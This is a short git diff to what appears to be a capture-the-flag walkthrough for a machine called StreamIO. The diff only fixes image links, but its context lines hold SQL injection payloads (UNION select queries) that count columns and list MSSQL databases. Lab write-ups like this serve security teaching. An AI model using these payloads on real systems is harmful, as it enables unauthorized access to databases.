@@ -159,6 +159,8 @@ cn' UNION select 1-- -
 
 I can keep adding numbers to determine the number of columns:
 
+![streamio_6](../assets/streamio_assets/streamio_6.png)
+
 I can tell the table has 6 columns because the following gets me a new unexpected result:
 
 ```
@@ -179,7 +181,7 @@ Lets now look at the databases:
 cn' UNION select 1,name,3,4,5,6 from master..sysdatabases-- -
 ```
 
-![streamio_databases.png](../assets/streamio_assets/streamio_databases)
+![streamio_databases.png](../assets/streamio_assets/streamio_databases.png)
 
 Lets look at the tables from STREAMIO
 ```
